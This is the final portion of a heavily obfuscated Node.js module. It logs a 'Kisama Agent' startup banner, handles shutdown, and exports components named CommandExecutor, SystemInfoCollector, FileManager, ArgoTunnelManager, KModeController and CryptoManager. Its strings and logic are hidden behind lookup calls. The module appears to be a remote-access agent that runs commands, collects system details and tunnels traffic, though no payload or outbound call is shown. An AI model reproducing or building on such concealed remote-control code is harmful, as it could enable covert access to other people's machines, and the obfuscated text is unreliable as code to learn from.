            a0D[gF(0x761)]('🚀\x20Kisama\x20Agent\x20Node.js\x20v' + a0P[gF(0x701)] + gF(0x2d2) + a0P[gF(0x83a)] + ':' + a0P[gF(0x95b)]), a0D[gF(0x761)](b[gF(0x54a)]), (b[gF(0x4cd)](a0P['KMODE'], '1') || b[gF(0x6f1)](a0P[gF(0x646)], '2') && a0aN[gF(0x51b)]()) && a0aN[gF(0x83f)](j);
        });
        process['on'](g1(0x44d), () => {
            const gG = g1;
            a0D['debug'](b[gG(0x5bd)]), k[gG(0x661)](), process['exit'](0x0);
        }), a0D[g1(0x761)](g1(0x2cc));
    } catch (m) {
        a0D['error'](g1(0x425), m), process[g1(0x3c2)](0x1);
    }
}
(require[a0aY(0x2fc)] === module || require[a0aY(0x2fc)]?.[a0aY(0x2bf)]?.['includes'](a0aY(0x6fa))) && a0aV()[a0aY(0x7a8)](a0D[a0aY(0x993)]);
module[a0aY(0x6a8)] = {
    'main': a0aV,
    'loadCurves': a0aU,
    'Config': a0P,
    'CryptoManager': a0R,
    'SystemInfoCollector': a0U,
    'CommandExecutor': a0V,
    'FileManager': a0Y,
    'TaskManager': a0a0,
    'TaskStore': a0Z,
    'ArgoTunnelManager': a0aM,
    'KModeController': a0aN,
    'ZipArchiver': a0X,
    'TempKeyManager': a0Q
};